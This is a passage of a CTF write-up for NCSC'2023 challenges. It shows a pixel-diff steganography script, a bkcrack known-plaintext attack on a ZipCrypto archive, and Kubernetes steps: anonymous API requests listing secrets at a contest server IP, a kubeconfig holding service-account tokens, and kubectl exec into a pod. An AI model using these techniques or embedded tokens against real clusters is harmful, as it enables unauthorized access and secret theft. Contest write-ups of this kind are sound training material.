<span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> string </span><br><span class=\"line\">im1=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;tobi.jpg&quot;</span>)</span><br><span class=\"line\">im2=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;tobi.png&quot;</span>)</span><br><span class=\"line\">pix2=im2.load()</span><br><span class=\"line\">pix1=im1.load()</span><br><span class=\"line\">width,height=im1.size</span><br><span class=\"line\">result=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">data=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,width):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,height):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> pix1[i,j] != pix2[i,j] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">0</span>] != pix2[i,j][<span class=\"number\">0</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">1</span>] != pix2[i,j][<span class=\"number\">1</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">2</span>] != pix2[i,j][<span class=\"number\">2</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">3</span>):</span><br><span class=\"line\">                data.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">abs</span>(pix1[i,j][k] - pix2[i,j][k])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> string.ascii_letters + string.digits + string.punctuation:</span><br><span class=\"line\">        result+=char</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br></pre></td></tr></table></figure>\n<p>So the logic behind that code is to extract the pixels that have a full difference then calculate the difference between them. After that we convert the numbers to chars (should be printable!)</p>\n<p>This expression will give us the different pixels</p>\n<figure class=\"highlight python\"><figcaption><span>exp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pix1[i,j] != pix2[i,j] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">0</span>] != pix2[i,j][<span class=\"number\">0</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">1</span>] != pix2[i,j][<span class=\"number\">1</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">2</span>] != pix2[i,j][<span class=\"number\">2</span>]</span><br></pre></td></tr></table></figure>\n<p>In addition this expression collect the result of calculation the diff between the 2 pixels of each image!</p>\n<figure class=\"highlight python\"><figcaption><span>diff</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">abs</span>(pix1[i,j][k] - pix2[i,j][k])))</span><br></pre></td></tr></table></figure>\n<p>Then it’s time to convert it to printable data!</p>\n<figure class=\"highlight python\"><figcaption><span>print</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> string.ascii_letters + string.digits + string.punctuation:</span><br><span class=\"line\">        result+=char</span><br></pre></td></tr></table></figure>\n<p>Running this code will give you this base64 encoding!  <code>dGgxNV8xNV9zaDB1TGRfYjNfaDRyRA==</code></p>\n<p>Bingo we got this statement!  <code>th15_15_sh0uLd_b3_h4rD</code> . Let’s wrap it in Securinets! Oh nooo! Didn’t work. I guess the challenge is not finished!</p>\n<p>We have 2 images! PNG and JPEG. Mmmm Let’s try to do some steganography on these images using the password/key that we got previously.</p>\n<p>The 1st idea in my mind is to try steghide! Nothing else! Let’s try it</p>\n<p><img data-src=\"https://imgur.com/VLbBAGf.png\" alt=\"\"></p>\n<p>YEEES MAAN! We got a flag.zip file! But wait it’s protected again 😦. I tried to brute force that thing using rockyou but failed !!! What is going on here! The flag is inside that zip what we should to do now!</p>\n<p>Let’s extract more information about the zip using  <code>7z</code>  utility</p>\n<figure class=\"highlight bash\"><figcaption><span>7z</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7z l  -slt flag.zip</span><br><span class=\"line\"></span><br><span class=\"line\">Path = flag.txt</span><br><span class=\"line\">Folder = -</span><br><span class=\"line\">Size = 40</span><br><span class=\"line\">Packed Size = 52</span><br><span class=\"line\">Modified = 2022-11-18 21:17:23</span><br><span class=\"line\">Created =</span><br><span class=\"line\">Accessed =</span><br><span class=\"line\">Attributes = A</span><br><span class=\"line\">Encrypted = +</span><br><span class=\"line\">Comment =</span><br><span class=\"line\">CRC = 4F639BBA</span><br><span class=\"line\">Method = ZipCrypto Store</span><br><span class=\"line\">Host OS = FAT</span><br><span class=\"line\">Version = 20</span><br><span class=\"line\">Volume Index = 0</span><br></pre></td></tr></table></figure>\n<p>Nice the flag.txt size is 40 bytes! So our flag is 40-chars strings! The encryption method is  <code>ZipCrypto</code> !</p>\n<p>Bingoo! This method is vulnerable! Let’s check how can we get our flag!</p>\n<p>After some searching we found a repository talking about “Crack legacy zip encryption with Biham and Kocher’s known plaintext attack.”</p>\n<p>I recommend to check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tpbWNpODYvYmtjcmFjaw==\">repo</span> and understand how this attack can be manipulated and how to install that tool!</p>\n<p>Let’s now start downloading the tool</p>\n<figure class=\"highlight bash\"><figcaption><span>wget</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz</span><br></pre></td></tr></table></figure>\n<p>We need to recover the internal key that will allow us to extract the file!</p>\n<p>The attack requires at least 12 bytes of known plaintext. At least 8 of them must be contiguous. The larger the contiguous known plaintext, the faster the attack. In our case we have a flag.txt that contains  <code>Securinets&#123;*&#125;</code></p>\n<p>In our case we know 11 chars ( <code>Securinets&#123;</code> ) and the last char  <code>&#125;</code></p>\n<p>Let’s recover our key now!</p>\n<figure class=\"highlight bash\"><figcaption><span>prepare our data</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;Securinets&#123;&quot;</span> &gt; plaintext.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;&#125;&quot;</span> | xxd <span class=\"comment\"># 7d is the result</span></span><br></pre></td></tr></table></figure>\n<p>The attack requires the plain text content and in case there is another seperate bytes we can specify the offset and the byte value in hex</p>\n<p>Now time to work !</p>\n<figure class=\"highlight bash\"><figcaption><span>get the key</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -p plaintext.txt -x 39 7d </span><br><span class=\"line\"></span><br><span class=\"line\">bkcrack 1.5.0 - 2022-07-07</span><br><span class=\"line\">[16:21:19] Z reduction using 4 bytes of known plaintext</span><br><span class=\"line\">100.0 % (4 / 4)</span><br><span class=\"line\">[16:21:19] Attack on 1405963 Z values at index 6</span><br><span class=\"line\">Keys: 184a904b d4557686 2222c7f2</span><br><span class=\"line\">9.2 % (129555 / 1405963)</span><br><span class=\"line\">[16:24:40] Keys</span><br><span class=\"line\">184a904b d4557686 2222c7f2</span><br></pre></td></tr></table></figure>\n<p>We got the keys !  <code>184a904b d4557686 2222c7f2</code> . Now we can decipher/decrypt the file! which means extract it from the zip!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -k 184a904b d4557686 2222c7f2 -d my_flag.txt   </span><br><span class=\"line\"></span><br><span class=\"line\">bkcrack 1.5.0 - 2022-07-07</span><br><span class=\"line\">[16:32:25] Writing deciphered data my_flag.txt (maybe compressed)</span><br><span class=\"line\">Wrote deciphered data.</span><br></pre></td></tr></table></figure>\n<p>Bingo We got the flag!!! How 2 images can hide data like that!</p>\n<p><img data-src=\"https://imgur.com/O8uXhZV.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;Z1p_CRyPt0_&amp;_5t3gH1d3_1s_BAd&#125;</code></p>\n<h1 id=\"kubernetes-challenge-serie\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-challenge-serie\">#</a> Kubernetes challenge serie</h1>\n<p>NCSC’2023 consider the 1st tunisian CTF competition that have a whole Kubernetes Category! These are oriented for beginners/Intermediate users to consodilate their basic knowledge in Kubernetes!</p>\n<p><img data-src=\"https://imgur.com/U69KQtM.png\" alt=\"\"></p>\n<h2 id=\"kubernetes-secrets\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-secrets\">#</a> Kubernetes: Secrets:</h2>\n<p>In this challenge we get an IP and the author told us that he have a secret in the cluster!<br>\n<img data-src=\"https://imgur.com/PCmO273.png\" alt=\"\"></p>\n<p>Visiting the IP on the browser will lead us to the author page! This is not our objective!</p>\n<p>We need to access to the API-Server. Let’s check the default port 6443</p>\n<figure class=\"highlight bash\"><figcaption><span>curl</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:6443/version</span><br></pre></td></tr></table></figure>\n<p>And this request is failed! Mmmm The author change the default api-server?? Nmap time! Let’s scan that IP!</p>\n<p>After checking the IP we get that port opened 7443!</p>\n<p><img data-src=\"https://imgur.com/GunNYhA.png\" alt=\"\"></p>\n<p>And Yes! We got a response! It’s KUBERNETES TIME!!</p>\n<p>Let’s check what permission we have as an anonymous users! To be honest I’ll try to check if I can got namespaces Or secrets first! Let me check that!</p>\n<figure class=\"highlight bash\"><figcaption><span>curl-namespaces</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:7443/api/v1/namespaces | grep <span class=\"string\">&#x27;&quot;name&quot;: &quot;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>And we got a list of namespaces! This is cool! We have  <code>task1,task2,task3 and task4</code>  namespaces! I bet that each challenge is in single namespace! This is Great!<br>\n<img data-src=\"https://imgur.com/vZrtZLd.png\" alt=\"\"></p>\n<p>Hummm We need secrets and this is the 1st challenge! So We are sure that we can list the secrets in the  <code>task1</code>  namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>curl-namespaces</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:7443/api/v1/namespaces/task1/secrets</span><br></pre></td></tr></table></figure>\n<p>Bingo We got the Secrets List! We are on the right way!<br>\n<img data-src=\"https://imgur.com/0PFJsCI.png\" alt=\"\"></p>\n<p>Flag :  <code>Securinets&#123;S3crEts_Ar3_S0_CriT1c4LL&#125;</code></p>\n<blockquote>\n<p>We got a message! We must check it for sure!</p>\n</blockquote>\n<p>Look what we got here !</p>\n<figure class=\"highlight text\"><figcaption><span>check</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Look here YOU will need this one believe me!!!</span><br><span class=\"line\"> eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg</span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-pody\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-pody\">#</a> Kubernetes: Pody:</h2>\n<p>After getting the secrets we can move to the next challenge that named  <code>Pody</code></p>\n<p><img data-src=\"https://imgur.com/hZQya2W.png\" alt=\"\"></p>\n<p>In this challenge the author told us that the container is inside a pod! So how can we get inside that pod? Thinking a little bit we didn’t get any solution expect opening a shell session inside the pod!</p>\n<p>Kubectl Are you there?? Yes! It’s Kubectl time! I love to work with kubectl I will not waste my time curling endpoints 😃 So I’ll make my kubeconfig file for this challenge!</p>\n<p>When I checked the secrets in the previous challenge I got the certificate authority Certifcate. And of course don’t forget the token that we got!</p>\n<blockquote>\n<p>This token is used for authentication and authorization in kubernetes. This authorization is occur on the api-server level not the etcd!</p>\n</blockquote>\n<p>Let’s make our kubeconfig! But wait! In case you don’t have kubectl, it’s time to install it! You can follow this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvdG9vbHMvaW5zdGFsbC1rdWJlY3RsLWxpbnV4Lw==\">guide</span> to install it</p>\n<figure class=\"highlight yaml\"><figcaption><span>kubeconfig</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Config</span></span><br><span class=\"line\"><span class=\"attr\">clusters:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">cluster:</span></span><br><span class=\"line\">    <span class=\"attr\">certificate-authority-data:</span>  <span class=\"string\">LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1ETXdOVEV5TWpVMU1sb1hEVE16TURNd01qRXlNalUxTWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTDEzCm0rOG5ySVlXU21hQjREMU9yWWJVS1hycE4rS2ZUZDk1TjA2UTQ5U3IyUU1FZkZXZHhjSGJadThRVWRIVXo1dFcKdmVvRnk4cFBpcmhhNHdGYnJEbXczdFp4NlgxbGxEZlp4b29jd1ZBOS9pMTBjNGE4TURvOGVuc1hlYWU1TytZcQpMZmdiM04zcWZYYjZmSHAzekwxeHJzWThPUEZVeHhmU3AxaElXa0RNZ0tZY0lhU2NoRVUzYTk0ZityY2tIOUFwCnltRi95TlB3bXgyU1RFZUVFSkZoZFdWUzVVamdSTmxnNzFPWklyb05DMXMzWEJxb2RiZ1FWUjBUeTI5bnJGc0QKQnBJQW1WQVRCS3QxTjcyRjRMRDA0c3M3QVUxU0NDSCtoUmlrTWE1ZkdtOTBjMWRacEVuZ1IyVEUwSzZ4WVY3TAplOElrcE5WOVBaLy9RT2ZqSnFFQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZBWWUzVktNRDY3T3V5NWhWTGxTN0RWeU52SExNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBSE9EMUNTNGQzNjJLRXE1dTZyQwpQOEF6a3hDMTJDdVF1bDh4aUVTajZ4M25wb25oT2M3WU0zRUhQZk5wNHRDZmNsdFpDMU51SXNrVDRuSkRLRTFYCjRNVFNOL0kxVDlGSHd5SUhNbDZMZm1RL1ZLVlo1YlZJMEZlUENQanFnOWZSbHFYaitsRUxJQnRJVE0xbUlmeW0KZlZmMisrS3h4OTFTME54bWRKUzU0amY1SUJMRVh2SnRiWFYrblZ1ekhER3l5eDREblVDMm4zR3NrcEtBOGRJRQpZZktRWk5IZjJ4L0FySWM2a3A0em9TSWI1RVQvdDk4b3p5R2pldlVnbDd1L0orUzkwTS9pWWgyaGlGSXRRVE1WCnBTa0pQM1lIbDlzWVRSS0dXZTBtcEtnVm1RZm9VTVNzdURrRnZ4ZFNhVG9QQUN6aUdxdUNnVXVyWHMxNXJjOWkKR2xBPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==</span></span><br><span class=\"line\">    <span class=\"attr\">server:</span> <span class=\"string\">https://20.169.73.19:7443</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">raf-k8s</span></span><br><span class=\"line\"><span class=\"attr\">contexts:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">context:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">ncsc-sa@raf-k8s</span></span><br><span class=\"line\">  <span class=\"attr\">context:</span></span><br><span class=\"line\">    <span class=\"attr\">cluster:</span> <span class=\"string\">raf-k8s</span></span><br><span class=\"line\">    <span class=\"attr\">user:</span> <span class=\"string\">ncsc-sa</span></span><br><span class=\"line\"><span class=\"attr\">current-context:</span> <span class=\"string\">ncsc-sa@raf-k8s</span></span><br><span class=\"line\"><span class=\"attr\">users:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">ncsc-sa</span></span><br><span class=\"line\">  <span class=\"attr\">user:</span></span><br><span class=\"line\">    <span class=\"attr\">token:</span> <span class=\"string\">eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg</span></span><br></pre></td></tr></table></figure>\n<p>This kubeconfig file will allow us to authenticate to the api-server using kubectl utility without wasting time specifying the token and other stuff!</p>\n<p>Assume that you save that file in name  <code>ncsc-k8s.conf</code> . Let’s export the KUBECONFIG env var.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">export</span> KUBECONFIG=ncsc-k8s.conf</span><br><span class=\"line\">$ kubectl get pods -n task2 </span><br><span class=\"line\">NAME      READY   STATUS    RESTARTS        AGE</span><br><span class=\"line\">web-app   1/1     Running   3 (2d19h ago)   17d</span><br></pre></td></tr></table></figure>\n<p>Bingo !! We got access and everything is ok until now. Let’s describe the pod and check what we have first before getting a shell !</p>\n<figure class=\"highlight bash\"><figcaption><span>describe pod</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe pod web-app -n task2   </span><br><span class=\"line\">Name:             web-app</span><br><span class=\"line\">Namespace:        task2</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">    Mounts:</span><br><span class=\"line\">      /etc/nginx/flag.txt from flag-configmap (rw,path=<span class=\"string\">&quot;flag.txt&quot;</span>)</span><br><span class=\"line\">      /var/cache/nginx from tmpfs-2 (rw)</span><br><span class=\"line\">      /var/run from tmpfs-1 (rw)</span><br><span class=\"line\">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-wrfpc (ro)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>Wow there is  <code>flag.txt</code>  file inside the pod! Let’s be more accurate! The flag is in  <code>/etc/nginx/flag.txt</code></p>\n<p>Let’s get a shell or run a command from the pod using the  <code>kubectl exec</code>  command!</p>\n<p><img data-src=\"https://imgur.com/6QTqehO.png\" alt=\"\"></p>\n<p>Yes we got the flag! And another message: Your current token is enough!</p>\n<blockquote>\n<p>I tried to delete the flag! But as expected the author make the pod Read-only file system</p>\n</blockquote>\n<p>Flag :  <code>Securinets&#123;Ex3c_1s_DAnGer0uS_B3_C4r3fUL&#125;</code></p>\n<h2 id=\"kubernetes-hidden\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-hidden\">#</a> Kubernetes: Hidden? :</h2>\n<p>We still have the same token! Our kubectl works fine. So no worries we can do it!</p>\n<p><img data-src=\"https://imgur.com/1Eny78d.png\" alt=\"\"></p>\n<p>In this challenge the flag is hidden?? But how!? Let’s check first what can we do in our  <code>task3</code>  namespace</p>\n<figure class=\"highlight bash\"><figcaption><span>service</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get service -n task3        </span><br><span class=\"line\">NAME      TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE</span><br><span class=\"line\">web-app   ClusterIP   10.109.128.98   &lt;none&gt;        80/TCP    17d</span><br></pre></td></tr></table></figure>\n<p>We can access to services! In case you don’t know what is service I recommend to check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvY29uY2VwdHMvc2VydmljZXMtbmV0d29ya2luZy9zZXJ2aWNlLw==\">page</span>. As we understand, There is a pod inside task3 namespace but we don’t have any access to it 😦!. No worries we still have services! This service as we can see its attached to that pod. Let’s get our flag!</p>\n<p>After a little bit of thinking, I got an idea! Let’s access to the service from our previous pod!</p>\n<p>YES MAN! pods and services can communicate between each others</p>\n<p><img data-src=\"https://imgur.com/uq3xAoV.png\" alt=\"\"></p>\n<p>Ok let’s do it then, we have the service internal IP and we can run curl command inside our previous pod!</p>\n<p><img data-src=\"https://imgur.com/DuPq2Sp.png\" alt=\"\"></p>\n<p>Bingo! Flag:  <code>Securinets&#123;K8s_S3rV1cEs_ArE_P0wErFull&#125;</code> <br>\nAnd as Usual! another token for the next challenge :</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In The Next Challenge You will Need This one!</span><br><span class=\"line\"> eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJuY3NjLXBhcnRpY2lwYW50LXRva2VuLTdnZ2JxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Im5jc2MtcGFydGljaXBhbnQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwNmM3OGJhZC01NjAwLTQ2N2QtYjdhYi0wNWQzN2RjMjg0MzIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazQ6bmNzYy1wYXJ0aWNpcGFudCJ9.exWa8skN0HdscxzG2PBFYn9eU9l_sL7hAjUw8sFPsnjUKHPHzmqwDpN4WfSPCHFOfv7KKimYvr9SuMjB75KuapxXKnyBwEaIZEkH3c0lavBCPYfGou_BrVsAHVSdbw6pQ9YYonuc3WTiGkcXC-XjKXfY8PGppmnGh7gUsuxY9xwpju10PutjIs8s0g9z2tTBYUhOraa54WRCODDGw-o415rXsaVHuV8A2Cj3jQZVBzXXi5-snfvjX27-nMyGDh4F0gu8sXD3PZfLjLdrOQpP6s_jzbUN9G1g8iLQTXNjCvgUw2cnBOvWtRGLtbdizOazlKUyJAOSXfmu3W45bMJPOg</span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-special\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-special\">#</a> Kubernetes: Special :</h2>\n<p>After getting the new token it’s time to edit the kubeconfig file! Just replace the old toke by the new one! To work with kubectl correctly!</p>\n<p><img data-src=\"https://imgur.com/iFClk1V.png\" alt=\"\"></p>\n<p>Something Special?? What a special? Everything in Kubernetes is SO Special!! So no worries, We can deal with that kind of things!</p>\n<p>Talking about something special take me to think about what we can call it  <code>Custom Resources Definition</code>  in Kubernetes!</p>\n<p>In Kubernetes, a custom resource is an extension of the Kubernetes API that allows you to define your own custom resources with their own custom controllers.</p>\n<p>A custom resource definition (CRD) is used to create a new custom resource type in Kubernetes. A CRD defines 